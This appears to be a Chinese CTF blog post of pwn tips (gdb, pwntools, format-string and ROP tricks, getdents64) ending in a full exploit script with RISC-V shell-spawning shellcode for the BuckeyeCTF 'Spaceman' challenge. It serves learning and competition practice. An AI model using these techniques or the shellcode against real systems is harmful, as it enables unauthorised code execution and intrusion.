# PWN杂记


本文主要用于记录pwn题目的一些tips

<!--more--> 

- gdb.attach(p,'b *0x40094c') 

- b *$rebase(0x相对基址偏移)0x 相对基址偏移就是 IDA 显示的三位数

- strings libc.so.6|grep ubuntu  

- strings libc.so.6|grep libc  查看libc 版本信息

- strings elf | grep GCC  查看libc 信息 但是不一定对，当编译环境和运行环境不一样时

- ![image-20220725100823523](https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202208022057067.png)

- 开启和关闭缓存区有什么区别

  开启的化printf 遇到\n才输出， 不开启 就直接输出

- `%*6$c %7$n`相当于`%addr c %7$n`  *6为格式化字符串第六个参数中的值

- %p%10$n 前面已经输出的字符 是%p那里的值，比如`0x7f60847b55a0`

- finish 命令和 return 命令的区别是，finish 命令会执行函数到正常退出；而 return  命令是立即结束执行当前函数并返回，也就是说，如果当前函数还有剩余的代码未执行完毕，也不会执行了。除此之外，return  命令还有一个功能，即可以指定该函数的返回值。

- 为了结束while的read循环`while ( read(0, nptr, 0x10uLL) > 0 )`可以用`p.shutdown('send')`命令，不过不能再发送第二次了

- IDA 修复jmp rax

  > https://bbs.pediy.com/thread-268245.htm
  >
  > https://blog.csdn.net/huzai9527/article/details/121204850
  >
  > https://www.jianshu.com/p/cc0bc578b951

- IO_flush_all_lockp函数触发条件：

  1. 当libc执行abort流程时 abort可以通过触发malloc_printerr来触发
  2. 当执行exit函数时
  3. 当执行流从main函数返回时

- 一个gadget,暂时不知道有什么用，先记录一下

  ```c
      pwndbg> x/20i svcudp_reply+26
      0x7f5cdf09931a <svcudp_reply+26>:    mov    rbp,QWORD PTR [rdi+0x48]
      0x7f5cdf09931e <svcudp_reply+30>:    mov    rax,QWORD PTR [rbp+0x18]
      0x7f5cdf099322 <svcudp_reply+34>:    lea    r13,[rbp+0x10]
      0x7f5cdf099326 <svcudp_reply+38>:    mov    DWORD PTR [rbp+0x10],0x0
      0x7f5cdf09932d <svcudp_reply+45>:    mov    rdi,r13
      0x7f5cdf099330 <svcudp_reply+48>:    call   QWORD PTR [rax+0x28]
  ```

- 一个将泄露出16进制的flag字符串转换的小脚本

  ```python
  a='flag{afffd8-e4-25-c73ec9b075-18008fbf}'
  for i in range(13):
      t=a[4*i:4*i+4]       #32位泄露出的是4字节，64位是8字节
      print(t[::-1],end='')
  ```

- 将泄露出的小端序数据转换为字符串

  ```python
  byte_str=ru('\n')[:-1].decode().replace("0xa",'').replace('0x','')
  print("byte_str==",byte_str)
  bytes_data = bytes.fromhex(byte_str)
  bytes_data=bytes_data.decode()
  string=""
  for i in range(0, len(bytes_data), 4):
      string=string+''.join(reversed(bytes_data[i:i+4]))
  print(string)
  ```

  

- patchelf 报错修复：https://zikh26.github.io/posts/8cbdee5a.html#patch-libc%E5%92%8Cld%E8%BF%87%E7%A8%8B

  ![image-20230118224539165](https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202303142111516.png)

- set context-output /dev/pts/2  方便调试

- ![image-20230301203618437](https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202303012036068.png)

- 在flag文件名未知的情况下无法构造常规orw来读取

  这时候可以利用getdents64函数，它读取目录文件中的一个个目录项并返回

  ![img](https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202303142111422)

  [参考：ls命令是怎样实现的，getdents64，linux-2.6.27.5](https://blog.csdn.net/cnbird2008/article/details/11629095)

- https://github.com/Naetw/CTF-pwn-tips  一些小tips

- `libc.search(asm('pop rdi;ret;')).__next__()`  搜索libc中的gadgets

- ```python
  rop=ROP(libc)
  pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret'])[0]
  ```

- 查看fs段寄存器：`p/x $fs_base`

- 某些情况下patchelf 需要将 libc.so.6 设置为绝对路径

  ```bash
  patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6   ./libc-2.32.so ./elf
  ```

- strcpy 会将结束符`\x00`copy到目标字符串，strlen遇到`'\x00'`截止

- qemu 调试异架构

  ```python
  def killport(port):
  
      '''root authority is required'''
  
      command="kill -9 $(netstat -nlp | grep :"+str(port)+" | awk '{print $7}' | awk -F'/' '{{ print $1 }}')"
  
      os.system(command)
  def mydbg():
      attach_payload ="""
      gdb-multiarch\
      -ex "file {0}"\
      -ex "targe remote :{1}"\
      -ex "setarchitecture {2}"\
      """.format('./1',port,"arm")
      # -ex "add-symbol-file {libc_file_path} {addr}"
      pwnlib.util.misc.run_in_new_terminal(attach_payload)
  ```

- 异构静态编译的情况下可以通过arena_get_retry和dl_runtime_reslove来控制参数

  aarch64

  riscv64:

  is_trusted_path_normalize 函数这里可以控制sp进行栈迁移

- dil 是rdi寄存器的低32位

  https://www.jianshu.com/p/57128e477efb

- 在libc段存在elf 地址，比如stdout

- 设置返回地址位libc_start_main_impl+139 程序会重新从main函数开始

- `set context-sections` 命令用于配置在打印当前堆栈帧时显示的上下文信息部分。它定义了在上下文输出中显示哪些信息。

  该命令接受一个字符串参数，用于指定要包含在上下文显示中的部分。可用的部分包括：

  - `all`：包括所有可用的部分。
  - `registers`：显示寄存器的值。
  - `code`：显示反汇编的代码。
  - `stack`：显示堆栈内存。
  - `data`：显示数据内存。

- gs，fs寄存器可以让我们找到程序的地址

- `%*`的利用

  [19:41]You can leak value on the stack using %*
  [19:41]Although u cant specify the index
  [19:41]U can use %c %c %* to get a leak on any position

- _nptl_change_stack_perm 可用于设置栈的权限，目前在risc-v题的题目中见过

BuckeyeCTF Spaceman

```python
from pwn import *
import struct
context.binary = elf = ELF("./spaceman")

# io = process("./run.sh")
# io = remote("127.0.0.1",1337)
io = remote("challs.pwnoh.io", 13372)

sc = b"A"*0x2e
sc = b"\x93\x08\xf0\x03\x13\x05\x00\x00\x93\x05\x81\xec\x13\x06\x00\x10s\x00\x00\x00"
# sc = b"A"*8
# sc += b"B"*8
# sc += b"C"*8
# sc += b"D"*8
io.sendlineafter(b'LOGIN: ',sc)
environ = 0x8f6a0
_read = 0x2474e

# arb write (write help function over echo 0x89028)
address = 0x89008#0x8a990
p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(address)
# p += b"C"*7
p += p64(_read)[:-1]
io.sendlineafter(b"COMMAND> ",p)
# sleep(1)
p2 = p64(0x89028)
p2 += p64(0x89028)[:-1]
io.sendlineafter(b"COMMAND> ", p2)
io.send(b"\xae\x07\x01")

# leak environ
p = b"gang\x00aaa"
# p += b"A"*8#p64(0x89028)
p = p.ljust(0x10,b"A")
p += p64(environ)
# p += b"C"*7
# p += p64(_read)[:-1]
io.sendlineafter(b"COMMAND> ",p)


io.sendlineafter(b"COMMAND> ",b"echo")
io.readuntil(b"COMMANDS:")
io.readline()
environ = u64(io.readline(False).ljust(8,b"\x00"))
print("environ",hex(environ))
sc_addr = environ-552
ret_addr = environ-144-96
pthread = 0x8a480

# reset sys_run
p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(0x5aa90) #help
# p += b"C"*7
p += p64(0x10854)[:-1] #sys_run
io.sendlineafter(b"COMMAND> ",p)

io.sendlineafter(b"COMMAND> ",b"help")
sc = p64(0x8aa00) # junk writable addr
sc += b"B"*8
sc += p64(0x4ef00)# make stack executable __nptl_change_stack_perm
sc += p64(0x8a480)
io.sendlineafter(b'LOGIN: ',sc)

# arb write (overwrite ret addr for gad1)
address = 0x89008#0x8a990
p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(address)
# p += b"C"*7
p += p64(_read)[:-1]
io.sendlineafter(b"COMMAND> ",p)
sleep(1)
p2 = p64(ret_addr)
p2 += p64(ret_addr)[:-1]
io.sendlineafter(b"COMMAND> ", p2)
io.sendline(p64(sc_addr)[:-1])

# sc_addr = 0x0040007ffc70

# p = b"gang\x00aaa"
# # p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
# p += p64(sc_addr)
# # p += b"C"*7
# # p += p64(_read)[:-1]
# io.sendlineafter(b"COMMAND> ",p)
# sleep(1)
# context.log_level = 'debug'


# call gad1
gad_1 = 0x443b8

p = b"gang\x00aaa"
p += b"A"*8#p64(0x89028)
# p = p.ljust(0x10,b"A")
p += p64(0x5aa90) #help
# p += b"C"*7
p += p64(gad_1)[:-1]
io.sendlineafter(b"COMMAND> ",p)

io.sendline(b"dish")
addr = struct.unpack("f",p32(sc_addr&0xfffff000))[0]
io.sendlineafter(b"ENTER COORDINATES: ", b"0 "+str(addr).encode() )

io.sendline("engines")
addr_top = (sc_addr&0xffffffff00000000)>>2**5
io.sendlineafter(b"ENTER POWER (0-10): ",str(addr_top).encode())

io.sendline(b"help")


full_shellcode = b"/bin/sh\x00"
full_shellcode += b"\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x13\x00\x00\x00\x17\x05\x00\x00\x13\x85\x05\x00\x93\x05\x00\x00\x13\x06\x00\x00\x93\x08\xd0\rs\x00\x00\x00"
io.sendline(full_shellcode)

io.interactive()
```



---

> 作者: chuwei  
> URL: https://chuw3i.github.io/posts/pwn%E6%9D%82%E8%AE%B0/  

